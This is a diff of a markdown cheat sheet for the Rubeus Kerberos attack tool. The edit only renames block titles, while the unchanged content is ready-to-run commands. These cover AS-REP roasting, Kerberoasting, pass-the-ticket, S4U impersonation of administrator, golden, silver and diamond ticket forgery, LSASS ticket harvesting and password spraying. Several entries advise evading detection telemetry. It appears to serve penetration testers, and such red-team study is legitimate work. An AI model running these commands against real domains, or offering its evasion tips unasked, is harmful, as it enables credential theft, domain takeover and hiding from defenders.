@@ -6,7 +6,7 @@
 
 ASREPRoast a single user and save the AS-REP hash to disk for offline cracking.
 
-```sh title:"ASREPRoast one user, save hash to file"
+```sh title:"Rubeus ASREPRoast one user, save hash to file"
 .\Rubeus.exe asreproast /user:$user /domain:$domain /dc:$rhost_name /nowrap /outfile:hashes.txt
 ```
 <!-- cheat
@@ -19,7 +19,7 @@ var rhost_name
 
 Same single-user ASREPRoast but emit the hash already in hashcat 18200 format.
 
-```sh title:"ASREPRoast one user in hashcat 18200 format"
+```sh title:"Rubeus ASREPRoast one user in hashcat 18200 format"
 .\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
 ```
 <!-- cheat
@@ -32,7 +32,7 @@ var user
 
 Print Kerberoast stats only (account counts, encryption types) without requesting tickets. Quick scope check.
 
-```sh title:"Print Kerberoast stats only, no tickets requested"
+```sh title:"Rubeus Print Kerberoast stats only, no tickets requested"
 .\Rubeus.exe kerberoast /stats
 ```
 <!-- cheat -->
@@ -41,7 +41,7 @@ Print Kerberoast stats only (account counts, encryption types) without requestin
 
 Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.
 
-```sh title:"Restrict roast to AdminSDHolder-protected users"
+```sh title:"Rubeus Restrict roast to AdminSDHolder-protected users"
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
 <!-- cheat -->
@@ -50,7 +50,7 @@ Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.
 
 Targeted Kerberoast against a named user.
 
-```sh title:"Targeted Kerberoast against named user"
+```sh title:"Rubeus Targeted Kerberoast against named user"
 .\Rubeus.exe kerberoast /user:$user /nowrap
 ```
 <!-- cheat
@@ -61,7 +61,7 @@ var user
 
 Bulk Kerberoast every SPN-enabled account in the domain.
 
-```sh title:"Bulk Kerberoast every SPN-enabled account"
+```sh title:"Rubeus Bulk Kerberoast every SPN-enabled account"
 .\Rubeus.exe kerberoast /nowrap
 ```
 <!-- cheat -->
@@ -70,7 +70,7 @@ Bulk Kerberoast every SPN-enabled account in the domain.
 
 Roast a target via the no-preauth path (DONT_REQ_PREAUTH set). Works without valid creds, given the target's SPN.
 
-```sh title:"Roast via no-preauth path, no creds required"
+```sh title:"Rubeus Roast via no-preauth path, no creds required"
 .\Rubeus.exe kerberoast /nopreauth:$user /domain:$domain /spn:$spn /nowrap
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ var spn
 
 Targeted roast against a user in a specific domain (cross-trust scenarios).
 
-```sh title:"Targeted roast across trust into specific domain"
+```sh title:"Rubeus Targeted roast across trust into specific domain"
 .\Rubeus.exe kerberoast /user:$user /domain:$domain /nowrap
 ```
 <!-- cheat
@@ -97,7 +97,7 @@ var domain
 
 Request a TGT using the user's RC4 hash and inject it into the current session in one step.
 
-```sh title:"Request TGT with RC4 hash and inject into session"
+```sh title:"Rubeus Request TGT with RC4 hash and inject into session"
 .\Rubeus.exe asktgt /rc4:$rc4_hash /user:$user /ptt
 ```
 <!-- cheat
@@ -109,7 +109,7 @@ var user
 
 Request a TGT with a cleartext password, output `.kirbi` (no PTT). Useful for relay-style flows where the ticket is consumed elsewhere.
 
-```sh title:"Request TGT with password, no PTT (output .kirbi)"
+```sh title:"Rubeus Request TGT with password, no PTT (output .kirbi)"
 .\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nowrap
 ```
 <!-- cheat
@@ -123,7 +123,7 @@ var rhost_name
 
 PKINIT TGT request using a certificate (PFX) and its password. `/getcredentials` returns the user's NT hash.
 
-```sh title:"PKINIT TGT via PFX cert + password, /getcredentials returns NT hash"
+```sh title:"Rubeus PKINIT TGT via PFX cert + password, /getcredentials returns NT hash"
 .\Rubeus.exe asktgt /user:$user /certificate:$certificate /password:"$pass" /domain:$domain /dc:$rhost_name /getcredentials /show /nowrap
 ```
 <!-- cheat
@@ -138,7 +138,7 @@ var rhost_name
 
 Request a TGT with an AES256 key instead of RC4. Prefer this when you have Kerberos keys and want to avoid RC4 downgrade telemetry.
 
-```sh title:"Request TGT with AES256 key"
+```sh title:"Rubeus Request TGT with AES256 key"
 .\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /dc:$rhost_name /nowrap
 ```
 <!-- cheat
@@ -152,7 +152,7 @@ var rhost_name
 
 Create a sacrificial net-only process and apply the TGT there so the current logon session's tickets are not clobbered.
 
-```cmd title:"Request TGT and apply it to a new net-only cmd.exe"
+```cmd title:"Rubeus Request TGT and apply it to a new net-only cmd.exe"
 .\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /createnetonly:C:\Windows\System32\cmd.exe /show
 ```
 <!-- cheat
@@ -165,7 +165,7 @@ var domain
 
 Request a TGT without a PAC. Useful for testing KDC behavior and reducing ticket size when PAC data is not needed.
 
-```cmd title:"Request TGT without PAC"
+```cmd title:"Rubeus Request TGT without PAC"
 .\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nopac /nowrap
 ```
 <!-- cheat
@@ -181,7 +181,7 @@ var rhost_name
 
 S4U2Self with `/altservice` to forge a usable service ticket as another user, then PTT.
 
-```sh title:"S4U2Self for impersonated user, PTT result"
+```sh title:"Rubeus S4U2Self for impersonated user, PTT result"
 .\Rubeus.exe s4u /self /nowrap /impersonateuser:$user /altservice:$service /ptt /ticket:$ticket
 ```
 <!-- cheat
@@ -194,7 +194,7 @@ var ticket
 
 S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.
 
-```sh title:"S4U2Proxy ticket as administrator on named SPN"
+```sh title:"Rubeus S4U2Proxy ticket as administrator on named SPN"
 .\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /altservice:$service /user:$user /rc4:$rc4_hash /ptt
 ```
 <!-- cheat
@@ -208,7 +208,7 @@ var rc4_hash
 
 Same admin S4U chain but without PTT; gets you the ticket on disk for use elsewhere.
 
-```sh title:"Admin S4U chain, no PTT, ticket to disk"
+```sh title:"Rubeus Admin S4U chain, no PTT, ticket to disk"
 .\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /domain:$domain /user:$user /rc4:$rc4_hash /nowrap
 ```
 <!-- cheat
@@ -222,7 +222,7 @@ var rc4_hash
 
 S4U2Self/altservice trick that forges a usable Administrator service ticket from a controlled account's TGT.
 
-```sh title:"S4U2Self altservice trick to forge admin service ticket"
+```sh title:"Rubeus S4U2Self altservice trick to forge admin service ticket"
 .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:$service /dc:$rhost_name /ptt /ticket:$ticket
 ```
 <!-- cheat
@@ -235,7 +235,7 @@ var ticket
 
 S4U2Proxy where the impersonated user is the same controlled user; useful in RBCD chains.
 
-```sh title:"S4U2Proxy self-impersonation, RBCD chain step"
+```sh title:"Rubeus S4U2Proxy self-impersonation, RBCD chain step"
 .\Rubeus.exe s4u /user:$user /rc4:$rc4_hash /impersonateuser:$user /msdsspn:$msdsspn /ptt
 ```
 <!-- cheat
@@ -248,7 +248,7 @@ var msdsspn
 
 Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a clean LUID without touching the host token.
 
-```sh title:"Net-only cmd.exe under sacrificial LUID for ticket loading"
+```sh title:"Rubeus Net-only cmd.exe under sacrificial LUID for ticket loading"
 .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
 <!-- cheat -->
@@ -259,7 +259,7 @@ Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a c
 
 Inject a `.kirbi` ticket file into the current logon session.
 
-```sh title:"Inject .kirbi ticket file into current session"
+```sh title:"Rubeus Inject .kirbi ticket file into current session"
 .\Rubeus.exe ptt /ticket:$ticket.kirbi
 ```
 <!-- cheat
@@ -270,7 +270,7 @@ var ticket
 
 Inject a base64-encoded ticket into the current session. Avoids dropping a file on disk.
 
-```sh title:"Inject base64-encoded ticket, no file on disk"
+```sh title:"Rubeus Inject base64-encoded ticket, no file on disk"
 .\Rubeus.exe ptt /ticket:$ticket
 ```
 <!-- cheat
@@ -281,7 +281,7 @@ var ticket
 
 Inject a ticket into a specific logon session. Requires elevation and is commonly paired with `createnetonly`.
 
-```cmd title:"Inject ticket into specific logon session"
+```cmd title:"Rubeus Inject ticket into specific logon session"
 .\Rubeus.exe ptt /luid:$luid /ticket:$ticket
 ```
 <!-- cheat
@@ -293,7 +293,7 @@ var ticket
 
 Purge Kerberos tickets from the current logon session.
 
-```cmd title:"Purge current session tickets"
+```cmd title:"Rubeus Purge current session tickets"
 .\Rubeus.exe purge
 ```
 <!-- cheat -->
@@ -302,7 +302,7 @@ Purge Kerberos tickets from the current logon session.
 
 Purge Kerberos tickets from a specific logon session. Requires elevation.
 
-```cmd title:"Purge tickets from specific LUID"
+```cmd title:"Rubeus Purge tickets from specific LUID"
 .\Rubeus.exe purge /luid:$luid
 ```
 <!-- cheat
@@ -313,7 +313,7 @@ var luid
 
 Parse a `.kirbi` or base64 ticket and show ticket metadata. If the service key is known, Rubeus can decrypt and show PAC details.
 
-```cmd title:"Describe a ticket"
+```cmd title:"Rubeus Describe a ticket"
 .\Rubeus.exe describe /ticket:$ticket /nowrap
 ```
 <!-- cheat
@@ -324,7 +324,7 @@ var ticket
 
 Decrypt the ticket with the service key and display PAC details.
 
-```cmd title:"Describe and decrypt ticket PAC"
+```cmd title:"Rubeus Describe and decrypt ticket PAC"
 .\Rubeus.exe describe /ticket:$ticket /servicekey:$service_key /nowrap
 ```
 <!-- cheat
@@ -336,7 +336,7 @@ var service_key
 
 List all tickets currently loaded in the session (LUID, target, encryption).
 
-```sh title:"List all tickets in session (LUID/target/enc)"
+```sh title:"Rubeus List all tickets in session (LUID/target/enc)"
 .\Rubeus.exe triage
 ```
 <!-- cheat -->
@@ -345,7 +345,7 @@ List all tickets currently loaded in the session (LUID, target, encryption).
 
 Dump Kerberos tickets from accessible logon sessions.
 
-```cmd title:"Dump all accessible Kerberos tickets"
+```cmd title:"Rubeus Dump all accessible Kerberos tickets"
 .\Rubeus.exe dump
 ```
 <!-- cheat -->
@@ -354,7 +354,7 @@ Dump Kerberos tickets from accessible logon sessions.
 
 Show detailed ticket information for the current or selected logon session.
 
-```cmd title:"Detailed ticket list"
+```cmd title:"Rubeus Detailed ticket list"
 .\Rubeus.exe klist /luid:$luid
 ```
 <!-- cheat
@@ -367,7 +367,7 @@ var luid
 
 Dump tickets for a specific LUID and service. Targeted variant of `triage` + extract.
 
-```sh title:"Dump tickets for specific LUID and service"
+```sh title:"Rubeus Dump tickets for specific LUID and service"
 .\Rubeus.exe dump /luid:$luid /service:$service /nowrap
 ```
 <!-- cheat
@@ -379,7 +379,7 @@ var service
 
 Forge a golden TGT with optional extra-SIDs (cross-forest impersonation).
 
-```sh title:"Forge golden TGT, optional extra-SIDs for cross-forest"
+```sh title:"Rubeus Forge golden TGT, optional extra-SIDs for cross-forest"
 .\Rubeus.exe golden /rc4:$rc4_hash /domain:$domain /sid:$sid /sids:$sids /user:$user /ptt
 ```
 <!-- cheat
@@ -394,7 +394,7 @@ var user
 
 Forge a golden ticket while letting Rubeus pull PAC fields from LDAP, then print a reusable command.
 
-```cmd title:"Forge golden ticket with LDAP-populated PAC"
+```cmd title:"Rubeus Forge golden ticket with LDAP-populated PAC"
 .\Rubeus.exe golden /aes256:$aes256_key /ldap /user:$user /domain:$domain /dc:$rhost_name /printcmd /ptt
 ```
 <!-- cheat
@@ -408,7 +408,7 @@ var rhost_name
 
 Forge a service ticket for a target SPN using the service account key. Add `/krbkey` when you also have the krbtgt key and want PAC checksums to line up.
 
-```cmd title:"Forge silver ticket for target service"
+```cmd title:"Rubeus Forge silver ticket for target service"
 .\Rubeus.exe silver /rc4:$rc4_hash /user:$user /service:$spn /domain:$domain /sid:$sid /ptt
 ```
 <!-- cheat
@@ -423,7 +423,7 @@ var sid
 
 Forge a service ticket with PAC fields populated from LDAP and a krbtgt key for stronger PAC signing.
 
-```cmd title:"Forge LDAP-populated silver ticket"
+```cmd title:"Rubeus Forge LDAP-populated silver ticket"
 .\Rubeus.exe silver /aes256:$aes256_key /user:$user /service:$spn /ldap /krbkey:$krbtgt_key /krbenctype:aes256 /domain:$domain /dc:$rhost_name /ptt
 ```
 <!-- cheat
@@ -439,7 +439,7 @@ var rhost_name
 
 Request a real TGT, modify PAC fields, and re-sign it with the krbtgt key. This keeps the normal request pattern while changing the embedded identity.
 
-```cmd title:"Forge diamond ticket from password"
+```cmd title:"Rubeus Forge diamond ticket from password"
 .\Rubeus.exe diamond /krbkey:$krbtgt_key /user:$user /password:$pass /domain:$domain /dc:$rhost_name /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
 ```
 <!-- cheat
@@ -457,7 +457,7 @@ var group_rids
 
 Use the `tgtdeleg` trick as the base ticket, then modify PAC fields with the krbtgt key.
 
-```cmd title:"Forge diamond ticket from tgtdeleg"
+```cmd title:"Rubeus Forge diamond ticket from tgtdeleg"
 .\Rubeus.exe diamond /krbkey:$krbtgt_key /tgtdeleg /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
 ```
 <!-- cheat
@@ -471,7 +471,7 @@ var group_rids
 
 Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a host you control to grab inbound tickets.
 
-```sh title:"Watch LSASS for inbound TGTs every 5s"
+```sh title:"Rubeus Watch LSASS for inbound TGTs every 5s"
 .\Rubeus.exe monitor /interval:5 /nowrap
 ```
 <!-- cheat -->
@@ -480,7 +480,7 @@ Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a h
 
 Monitor for new TGTs belonging to a specific user or machine account.
 
-```cmd title:"Watch for TGTs from one target user"
+```cmd title:"Rubeus Watch for TGTs from one target user"
 .\Rubeus.exe monitor /targetuser:$target_user /interval:$seconds /runfor:$runfor_seconds /nowrap
 ```
 <!-- cheat
@@ -493,7 +493,7 @@ var runfor_seconds
 
 Maintain a cache of observed TGTs and renew them before expiry. Useful on unconstrained delegation hosts.
 
-```cmd title:"Harvest and auto-renew observed TGTs"
+```cmd title:"Rubeus Harvest and auto-renew observed TGTs"
 .\Rubeus.exe harvest /monitorinterval:$monitor_seconds /displayinterval:$display_seconds /nowrap
 ```
 <!-- cheat
@@ -505,7 +505,7 @@ var display_seconds
 
 Request a TGS for a named service using an existing TGT and PTT.
 
-```sh title:"Request TGS for named service from existing TGT"
+```sh title:"Rubeus Request TGS for named service from existing TGT"
 .\Rubeus.exe asktgs /ticket:$ticket /service:$service /ptt
 ```
 <!-- cheat
@@ -517,7 +517,7 @@ var service
 
 Request a service ticket through LSA using the current session TGT. This avoids supplying a ticket blob and makes traffic originate from LSASS.
 
-```cmd title:"Request TGS through current logon session"
+```cmd title:"Rubeus Request TGS through current logon session"
 .\Rubeus.exe asktgs /service:$spn /nowrap
 ```
 <!-- cheat
@@ -528,7 +528,7 @@ var spn
 
 Request a service ticket with a specific encryption type.
 
-```cmd title:"Request TGS with chosen encryption type"
+```cmd title:"Rubeus Request TGS with chosen encryption type"
 .\Rubeus.exe asktgs /ticket:$ticket /service:$spn /enctype:$enctype /dc:$rhost_name /nowrap
 ```
 <!-- cheat
@@ -542,7 +542,7 @@ var rhost_name
 
 Use U2U to request a PAC for a target user and inspect the result with `describe`.
 
-```cmd title:"Request U2U ticket for target user's PAC"
+```cmd title:"Rubeus Request U2U ticket for target user's PAC"
 .\Rubeus.exe asktgs /u2u /targetuser:$target_user /ticket:$ticket /tgs:$tgs /nowrap
 ```
 <!-- cheat
@@ -555,7 +555,7 @@ var tgs
 
 Renew a TGT and inject it. Extends ticket lifetime when the original is about to expire.
 
-```sh title:"Renew TGT and inject, extends ticket lifetime"
+```sh title:"Rubeus Renew TGT and inject, extends ticket lifetime"
 .\Rubeus.exe renew /ticket:$ticket /ptt
 ```
 <!-- cheat
@@ -566,7 +566,7 @@ var ticket
 
 Loop until the renew-till window expires, renewing the TGT before each end time.
 
-```cmd title:"Auto-renew TGT until renew-till expires"
+```cmd title:"Rubeus Auto-renew TGT until renew-till expires"
 .\Rubeus.exe renew /ticket:$ticket /autorenew /nowrap
 ```
 <!-- cheat
@@ -577,7 +577,7 @@ var ticket
 
 Substitute the service in a TGS by rewriting the sname (silver ticket repurposing trick).
 
-```sh title:"Rewrite sname to repurpose silver ticket for new service"
+```sh title:"Rubeus Rewrite sname to repurpose silver ticket for new service"
 .\Rubeus.exe tgssub /ticket:$ticket /altservice:$service /nowrap
 ```
 <!-- cheat
@@ -589,7 +589,7 @@ var service
 
 Compute Kerberos keys (RC4, AES128, AES256) from a cleartext password for the specified user/domain.
 
-```sh title:"Compute RC4/AES Kerberos keys from cleartext password"
+```sh title:"Rubeus Compute RC4/AES Kerberos keys from cleartext password"
 .\Rubeus.exe hash /password:$pass /user:$user /domain:$domain
 ```
 <!-- cheat
@@ -602,7 +602,7 @@ var domain
 
 Spray a single password across users via Kerberos. `/noticket` suppresses successful TGT output.
 
-```cmd title:"Kerberos password spray from user list"
+```cmd title:"Rubeus Kerberos password spray from user list"
 .\Rubeus.exe brute /password:$pass /users:$users_file /domain:$domain /dc:$rhost_name /noticket
 ```
 <!-- cheat
@@ -616,7 +616,7 @@ var rhost_name
 
 Try a password list against one user over Kerberos.
 
-```cmd title:"Kerberos brute force one user"
+```cmd title:"Rubeus Kerberos brute force one user"
 .\Rubeus.exe brute /user:$user /passwords:$passwords_file /domain:$domain /dc:$rhost_name /noticket
 ```
 <!-- cheat
@@ -630,7 +630,7 @@ var rhost_name
 
 Scan a user list for accounts that do not require Kerberos pre-authentication.
 
-```cmd title:"Find AS-REP roastable users by pre-auth scan"
+```cmd title:"Rubeus Find AS-REP roastable users by pre-auth scan"
 .\Rubeus.exe preauthscan /users:$users_file /domain:$domain /dc:$rhost_name
 ```
 <!-- cheat
@@ -643,7 +643,7 @@ var rhost_name
 
 Use the GSS-API delegation trick to retrieve a usable TGT for the current user without elevation.
 
-```cmd title:"Retrieve usable current-user TGT via delegation"
+```cmd title:"Rubeus Retrieve usable current-user TGT via delegation"
 .\Rubeus.exe tgtdeleg /target:$spn
 ```
 <!-- cheat
@@ -654,7 +654,7 @@ var spn
 
 Use an existing TGT or changepw ticket to reset a password through Kerberos.
 
-```cmd title:"Change Kerberos password using ticket"
+```cmd title:"Rubeus Change Kerberos password using ticket"
 .\Rubeus.exe changepw /ticket:$ticket /new:$new_pass /dc:$rhost_name /targetuser:$domain\$user
 ```
 <!-- cheat
@@ -669,7 +669,7 @@ var user
 
 Print the current logon session ID.
 
-```cmd title:"Show current logon session LUID"
+```cmd title:"Rubeus Show current logon session LUID"
 .\Rubeus.exe currentluid
 ```
 <!-- cheat -->
@@ -678,7 +678,7 @@ Print the current logon session ID.
 
 Show logon session details for the current or selected LUID.
 
-```cmd title:"Show logon session details"
+```cmd title:"Rubeus Show logon session details"
 .\Rubeus.exe logonsession /luid:$luid
 ```
 <!-- cheat
@@ -689,7 +689,7 @@ var luid
 
 Skip AES-enabled accounts to avoid the 4769-A event ID flag that AES Kerberoasting raises in modern hunts.
 
-```sh title:"Roast RC4-only accounts (skip noisy AES tickets)"
+```sh title:"Rubeus Roast RC4-only accounts (skip noisy AES tickets)"
 .\Rubeus.exe kerberoast /rc4opsec /outfile:$output_file
 ```
 <!-- cheat
@@ -700,7 +700,7 @@ var output_file
 
 Target AES-enabled accounts specifically. Slower to crack but bypasses some weak detection rules that only watch RC4.
 
-```sh title:"Roast AES-only accounts (slower crack, lower RC4 telemetry)"
+```sh title:"Rubeus Roast AES-only accounts (slower crack, lower RC4 telemetry)"
 .\Rubeus.exe kerberoast /aes /outfile:$output_file
 ```
 <!-- cheat
@@ -711,7 +711,7 @@ var output_file
 
 Targeted roast in `/simple` output format - just the hash, no surrounding metadata.
 
-```sh title:"Targeted roast in /simple hash-only output format"
+```sh title:"Rubeus Targeted roast in /simple hash-only output format"
 .\Rubeus.exe kerberoast /user:$target_user /simple /outfile:$output_file
 ```
 <!-- cheat
